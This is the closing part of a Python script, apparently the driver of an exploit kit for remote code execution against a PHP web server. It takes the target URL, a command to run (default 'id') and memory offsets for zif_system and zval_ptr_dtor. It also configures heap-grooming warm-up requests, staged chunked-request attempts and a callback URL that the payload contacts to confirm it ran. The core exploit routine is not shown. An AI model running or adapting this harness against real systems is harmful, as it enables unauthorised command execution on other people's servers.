    ap.add_argument("--output", default=None)
    ap.add_argument("--pool-dir", default=None)
    ap.add_argument("--container", default=None)
    ap.add_argument("--log-dir", default=None)
    ap.add_argument("--proof-dir", default=None)
    ap.add_argument("--proof-file", default=None)
    ap.add_argument("--container-proof-file", default=None)
    ap.add_argument("--callback", default=None,
                    help="callback base URL; payload requests <callback>/<marker>")
    ap.add_argument("--callback-log", default=None,
                    help="optional callback collector log; a marker line is recorded")
    ap.add_argument("--allow-callback-as-proof", action="store_true",
                    help="exit 0 on a callback hit even without a uid proof file (off by default)")
    ap.add_argument("--warmup", type=int, default=10,
                    help="benign GETs before the first attempt (default 10)")
    ap.add_argument("--b1-max", type=int, default=10)
    ap.add_argument("--a2-block", type=int, default=5)
    ap.add_argument("--b2-max", type=int, default=10)
    ap.add_argument("--timeout", type=float, default=180.0)
    ap.add_argument("--continue-on-crash", action="store_true")
    ap.add_argument("--command", default="id")
    ap.add_argument("--path", default=None)
    ap.add_argument("--s-off", type=lambda x: int(x, 0), default=S_OFF)
    ap.add_argument("--zif-off", type=lambda x: int(x, 0), default=ZIF_SYSTEM_OFF)
    ap.add_argument("--zdtor-off", type=lambda x: int(x, 0), default=ZVAL_PTR_DTOR_OFF)
    ap.add_argument("--main-bucket", type=int, default=MAIN_BUCKET)
    ap.add_argument("--dry-run", action="store_true")
    return ap


def main() -> int:
    args = build_parser().parse_args()
    if args.attempts < 1:
        raise SystemExit("--attempts must be >= 1")
    if args.b1_max < 1 or args.a2_block < 1 or args.b2_max < 1:
        raise SystemExit("--b1-max/--a2-block/--b2-max must be >= 1")
    kit_root = os.path.abspath(args.kit_root)
    if args.output is None:
        args.output = os.path.join(
            kit_root, "out", "pool_%s_%s" % (args.marker, time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())))
    if args.dry_run:
        bodies, records = load_bodies(kit_root)
        plan = {
            "kit": os.path.basename(kit_root),
            "url": args.url,
            "marker": args.marker,
            "output": os.path.abspath(args.output),
            "bodies": records,
            "offsets": {"S": hex(args.s_off), "zif_system": hex(args.zif_off),
                        "zval_ptr_dtor": hex(args.zdtor_off), "main_bucket": args.main_bucket},
            "protocol": {"A1": "chunked", "B1_max": args.b1_max,
                         "A2_block": args.a2_block, "B2_max": args.b2_max},
        }
        print(json.dumps(plan, indent=1, sort_keys=True))
        return 0
    runner = Runner(args)
    try:
        return runner.run()
    finally:
        runner.close()


if __name__ == "__main__":
    sys.exit(main())
